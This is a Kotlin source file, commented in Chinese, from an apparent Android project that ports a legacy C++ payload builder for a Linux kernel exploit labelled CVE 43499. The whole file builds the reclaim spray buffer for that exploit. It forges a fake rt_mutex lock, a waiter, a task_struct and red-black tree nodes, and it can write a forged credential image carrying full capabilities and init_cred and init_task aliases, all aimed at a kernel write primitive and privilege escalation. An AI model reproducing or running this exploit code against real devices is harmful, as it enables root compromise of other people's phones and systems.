package com.ghostlock.app.backend.backends.cve43499.generator

import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499PlacementFacts

/**
 * 43499 landing payload 构造器（R3b；legacy2 `support.cpp:417-549`
 * `prepare_skb_payload` 的 Kotlin 移植）。
 *
 * 数据流：Placement 回传 `candidatePageBase` 后，由此派生假 lock/waiter/fake_task/rb
 * 节点与写值，按 legacy 槽位布局把同一份内容写进发送缓冲的两个 `allocation` 分块
 * （reclaim sendmsg 的 64 KiB 缓冲；哪一块落到目标 slab 页都能命中）。
 *
 * 约束：
 * - 只实现 `compact_waiter=1` 的 5.15/6.1 `tree_entry` waiter 布局；
 * - 只实现 W1（`mode=Zero` + `preserve_child`）写；W2/W3 与凭据镜像属 R3d 候选；
 * - 纯函数：不触 Native、不持有 token；越界/非法事实 ⇒ [Cve43499GeneratorException]。
 *
 * @note 阶段：R3b；真机未验证。
 */
internal object Cve43499PayloadBuilder {
    /** 内核指针宽度（结构常量，不是目标参数；三路地址都按 8 字节指针编码）。 */
    private const val POINTER_BYTES = 8L

    /**
     * 构造 landing 发送缓冲。
     *
     * @param facts Placement 事务回传的只读物理事实（base/几何）。
     * @param context generator 上下文（debug 目标事实 + 执行参数）。
     * @param tcpLayout true=使用 tcp 布局（payload_delta/chunk_bias/fake_task 槽不同）。
     * @param request 本事务写请求（target/mode/preserve_child；R3d 多写链显式传入）。
     * @return 64 KiB 内容 + 派生地址 + 写布局。
     * @throws Cve43499GeneratorException 事实/布局/请求非法（fail-closed）。
     */
    fun build(
        facts: Cve43499PlacementFacts,
        context: Cve43499GeneratorContext,
        tcpLayout: Boolean,
        request: Cve43499WriteRequest = context.writeRequest(),
    ): Cve43499PayloadResult {
        val layout = context.debug.generator.payload
        if (layout.compactWaiter != 1) {
            /* 非 compact（6.6 rb_node）waiter 布局未移植：具名拒绝，不猜布局。 */
            throw Cve43499GeneratorException("payload-layout:compact-waiter-required")
        }
        val base = facts.candidatePageBase
        if (base == 0L) {
            throw Cve43499GeneratorException("facts:candidate-page-base-zero")
        }
        val allocation = facts.allocationSize
        val pageSize = facts.pageSize
        if (allocation <= 0L || pageSize <= 0L) {
            throw Cve43499GeneratorException("facts:page-geometry")
        }
        if (allocation % pageSize != 0L) {
            throw Cve43499GeneratorException("facts:allocation-not-page-multiple")
        }
        if (allocation > Int.MAX_VALUE.toLong() / 2L) {
            throw Cve43499GeneratorException("facts:allocation-too-large")
        }
        val contentSize = allocation * 2L
        if (context.execution.reclaimPayloadSize != contentSize) {
            throw Cve43499GeneratorException("facts:reclaim-payload-size-mismatch")
        }

        val initCredAlias = if (request.mode == Cve43499WriteMode.CREDENTIAL) {
            context.initCredAlias()
        } else {
            0L
        }
        val write = writeLayout(request, base, layout, POINTER_BYTES, initCredAlias)
        if (!layoutMatchesRequest(request, write)) {
            throw Cve43499GeneratorException("write-layout:request-mismatch")
        }
        val credCopyOffset = if (tcpLayout) {
            context.debug.generator.credential.tcpCopyOffset
        } else {
            context.debug.generator.credential.copyOffset
        }
        val credentialCopy: ByteArray? = if (write.needsCredentialCopy) {
            buildCredentialCopy(context, allocation)
        } else {
            null
        }
        val initTaskAlias = context.dataAlias(context.debug.offsets.initTask)
        val taskGroupAlias = context.dataAlias(context.debug.offsets.rootTaskGroup)

        val payloadDelta = if (tcpLayout) layout.tcpPayloadDelta else layout.skbDataDelta
        val payloadBase = addExact(base, payloadDelta, "payload:base-overflow")
        val fakeLock = addExact(payloadBase, layout.lockOff, "payload:lock-overflow")
        val fakeW0 = addExact(payloadBase, layout.w0Off, "payload:waiter-overflow")
        val fakeTaskOffset = if (tcpLayout) layout.tcpFakeTaskOff else layout.fakeTaskOff
        val fakeTask = addExact(payloadBase, fakeTaskOffset, "payload:task-overflow")

        val buffer = Cve43499LeWriter(ByteArray(contentSize.toInt()))
        val chunkBias = if (tcpLayout) layout.tcpChunkBias else layout.skbFragBias
        var chunk = 0L
        while (chunk < contentSize) {
            val at = addExact(chunk, chunkBias, "payload:chunk-overflow")
            writeChunk(
                writer = buffer,
                at = at,
                layout = layout,
                request = request,
                write = write,
                fakeLock = fakeLock,
                fakeW0 = fakeW0,
                fakeTask = fakeTask,
                fakeTaskOffset = fakeTaskOffset,
                initTaskAlias = initTaskAlias,
                taskGroupAlias = taskGroupAlias,
                context = context,
            )
            if (credentialCopy != null) {
                writeCredentialCopy(
                    writer = buffer,
                    at = at,
                    copyOffset = credCopyOffset,
                    copy = credentialCopy,
                    contentSize = contentSize,
                )
            }
            chunk += allocation
        }
        return Cve43499PayloadResult(
            bytes = buffer.bytesView(),
            payloadBase = payloadBase,
            fakeLock = fakeLock,
            fakeW0 = fakeW0,
            fakeTask = fakeTask,
            writeLayout = write,
        )
    }

    /**
     * 构造 cred 镜像（legacy2 `support.cpp:300-345` `fill_profile_cred_copy`）。
     *
     * 布局：usage/caps/ref 槽全部来自 debug `cred` 段；ref 值 = image 绝对地址经
     * [dataAliasImage] 转成 direct-map 别名（legacy `ResolvedAddresses::data_alias`）。
     *
     * @param context generator 上下文。
     * @param allocation 单个 allocation 分块大小（legacy 校验 `copy_size <= ORDER3_SIZE`）。
     * @return cred 镜像字节（长度=debug `cred.copy_size`；未写字节为 0）。
     * @throws Cve43499GeneratorException copy 越界/ref 槽缺失（fail-closed）。
     */
    private fun buildCredentialCopy(
        context: Cve43499GeneratorContext,
        allocation: Long,
    ): ByteArray {
        val cred = context.debug.cred
        val credential = context.debug.generator.credential
        val copySize = cred.copySize
        if (copySize <= 0L || copySize > allocation ||
            copySize > Int.MAX_VALUE.toLong()
        ) {
            throw Cve43499GeneratorException("credential:copy-size")
        }
        val buffer = Cve43499LeWriter(ByteArray(copySize.toInt()))
        val usageOffset = cred.usageOffset ?: 0L
        if (usageOffset < 0L || usageOffset + 4L > copySize) {
            throw Cve43499GeneratorException("credential:usage-offset")
        }
        buffer.putU32(usageOffset, cred.usageValue)
        if (cred.capsCount < 0L || cred.capsOffset < 0L) {
            throw Cve43499GeneratorException("credential:caps-geometry")
        }
        for (index in 0 until cred.capsCount) {
            val at = addExact(
                cred.capsOffset,
                index * 8L,
                "credential:caps-overflow",
            )
            if (at + 8L > copySize) {
                throw Cve43499GeneratorException("credential:caps-range")
            }
            buffer.putU64(at, cred.capsValue)
        }
        val refOffsets = listOf(
            cred.ref0Offset,
            cred.ref1Offset,
            cred.ref2Offset,
            cred.ref3Offset,
        )
        val refImages = listOf(
            cred.ref0Image,
            cred.ref1Image,
            cred.ref2Image,
            cred.ref3Image,
        )
        val refCount = cred.refCount ?: 0L
        if (refCount < 0L || refCount > refOffsets.size.toLong()) {
            throw Cve43499GeneratorException("credential:ref-count")
        }
        val model = context.debug.generator.addressModel
        for (index in 0 until refCount) {
            val slotOffset = refOffsets[index.toInt()]
                ?: throw Cve43499GeneratorException("credential:ref-offset-missing")
            val image = refImages[index.toInt()]
                ?: throw Cve43499GeneratorException("credential:ref-image-missing")
            if (slotOffset < 0L || slotOffset + 8L > copySize) {
                throw Cve43499GeneratorException("credential:ref-range")
            }
            buffer.putU64(
                slotOffset,
                dataAliasImage(image, model, credential.imageTextBase),
            )
        }
        return buffer.bytesView()
    }

    /**
     * 把一个 cred 镜像写进某个 allocation 分块（legacy `p + CRED_COPY_OFF`）。
     *
     * @param writer 目标写器。
     * @param at 本分块槽位基准偏移（chunk + chunk_bias）。
     * @param copyOffset cred 镜像相对基准的偏移。
     * @param copy cred 镜像字节。
     * @param contentSize 发送缓冲总长（越界 fail-closed）。
     * @throws Cve43499GeneratorException 越界。
     */
    private fun writeCredentialCopy(
        writer: Cve43499LeWriter,
        at: Long,
        copyOffset: Long,
        copy: ByteArray,
        contentSize: Long,
    ) {
        if (copyOffset < 0L) {
            throw Cve43499GeneratorException("credential:copy-offset")
        }
        val target = addExact(at, copyOffset, "credential:copy-target-overflow")
        if (target + copy.size.toLong() > contentSize) {
            throw Cve43499GeneratorException("credential:copy-out-of-bounds")
        }
        writer.putBytes(target, copy)
    }

    /**
     * 写一个 allocation 分块的全部载荷字段。
     *
     * @param writer 目标写器。
     * @param at 本分块槽位基准的绝对偏移（chunk + chunk_bias）。
     * @param layout payload 槽位布局。
     * @param request 写请求（左子写 target 的原值）。
     * @param write 写布局（parent/value/left）。
     * @param fakeLock/fakeW0/fakeTask 派生地址。
     * @param fakeTaskOffset 假 task 槽在本分块内的相对偏移。
     * @param initTaskAlias waiter->task / pi_top_task 使用的内核别名。
     * @param taskGroupAlias 假 task 的 task_group 别名。
     * @param context generator 上下文（取 task_struct 字段偏移与 fake 常量）。
     */
    @Suppress("LongParameterList")
    private fun writeChunk(
        writer: Cve43499LeWriter,
        at: Long,
        layout: com.ghostlock.app.data.cve43499.DebugPayloadLayout,
        request: Cve43499WriteRequest,
        write: Cve43499WriteLayout,
        fakeLock: Long,
        fakeW0: Long,
        fakeTask: Long,
        fakeTaskOffset: Long,
        initTaskAlias: Long,
        taskGroupAlias: Long,
        context: Cve43499GeneratorContext,
    ) {
        /* --- lock 槽：rt_mutex owner/wait_lock/wait_list（legacy `LOCK_OFF` 段）。 --- */
        writer.putU32(addExact(at, layout.lockOff, "payload:lock-u32"), 0L)
        writer.putU64(addExact(at, addExact(layout.lockOff, 0x08L, "payload:lock+8"), "payload:lock+8"), fakeW0)
        writer.putU64(addExact(at, addExact(layout.lockOff, 0x10L, "payload:lock+16"), "payload:lock+16"), fakeW0)
        writer.putU64(
            addExact(at, addExact(layout.lockOff, 0x18L, "payload:lock+24"), "payload:lock+24"),
            fakeTask or 1L,
        )
        /* --- compact waiter 槽：tree_entry/pi_tree_entry/task/lock/wake 字段。 --- */
        val w0 = addExact(at, layout.w0Off, "payload:waiter")
        writer.putU64(w0, 1L)
        writer.putU64(addExact(w0, 0x08L, "payload:waiter+8"), 0L)
        writer.putU64(addExact(w0, 0x10L, "payload:waiter+16"), 0L)
        if (write.value != 0L) {
            /* preserve_child：pc=value，右子=0，左子=写入目标（legacy encode_compact_waiter）。 */
            writer.putU64(addExact(w0, 0x18L, "payload:waiter+24"), write.value)
            writer.putU64(addExact(w0, 0x20L, "payload:waiter+32"), 0L)
            /* 左子写原始 target（legacy encode_compact_waiter 用 request.target）。 */
            writer.putU64(addExact(w0, 0x28L, "payload:waiter+40"), request.target)
        } else {
            writer.putU64(addExact(w0, 0x18L, "payload:waiter+24"), write.parent)
            writer.putU64(addExact(w0, 0x20L, "payload:waiter+32"), write.value)
            writer.putU64(addExact(w0, 0x28L, "payload:waiter+40"), write.left)
        }
        writer.putU64(addExact(w0, 0x30L, "payload:waiter+48"), initTaskAlias)
        writer.putU64(addExact(w0, 0x38L, "payload:waiter+56"), fakeLock)
        writer.putU32(addExact(w0, 0x40L, "payload:waiter+64"), 0L)
        writer.putU32(
            addExact(w0, 0x44L, "payload:waiter+68"),
            layout.fakeWaiterPrio,
        )
        writer.putU64(addExact(w0, 0x48L, "payload:waiter+72"), 0L)
        writer.putU64(addExact(w0, 0x50L, "payload:waiter+80"), 0L)

        /* --- 假 task：usage/prio/normal_prio/pi_lock/pi_waiters/group/pi_top/blocked。 --- */
        val task = addExact(at, fakeTaskOffset, "payload:task")
        val taskStruct = context.debug.taskStruct
        writer.putU32(
            addExact(task, layout.fakeTaskUsageOff, "payload:task-usage"),
            0x100L,
        )
        writer.putU32(
            addExact(task, taskStruct.prio.toLong(), "payload:task-prio"),
            layout.fakeTaskPrio,
        )
        writer.putU32(
            addExact(task, taskStruct.normalPrio.toLong(), "payload:task-nprio"),
            layout.fakeTaskPrio,
        )
        writer.putU32(
            addExact(task, taskStruct.piLock, "payload:task-pi-lock"),
            0L,
        )
        val piWaiters = addExact(task, taskStruct.piWaiters, "payload:task-pi-waiters")
        writer.putU64(piWaiters, 0L)
        writer.putU64(addExact(piWaiters, 0x08L, "payload:task-pi-waiters+8"), 0L)
        writer.putU64(
            addExact(task, taskStruct.schedTaskGroup, "payload:task-group"),
            taskGroupAlias,
        )
        writer.putU64(
            addExact(task, taskStruct.piTopTask, "payload:task-pi-top"),
            initTaskAlias,
        )
        writer.putU64(
            addExact(task, taskStruct.piBlockedOn, "payload:task-pi-blocked"),
            0L,
        )

        /* --- rb 右/左节点：parent/0/0（legacy `RIGHT_OFF`/`LEFT_OFF` 段）。 --- */
        val right = addExact(at, layout.rightOff, "payload:right")
        writer.putU64(right, write.parent)
        writer.putU64(addExact(right, 0x08L, "payload:right+8"), 0L)
        writer.putU64(addExact(right, 0x10L, "payload:right+16"), 0L)
        val left = addExact(at, layout.leftOff, "payload:left")
        writer.putU64(left, write.parent)
        writer.putU64(addExact(left, 0x08L, "payload:left+8"), 0L)
        writer.putU64(addExact(left, 0x10L, "payload:left+16"), 0L)
    }
}
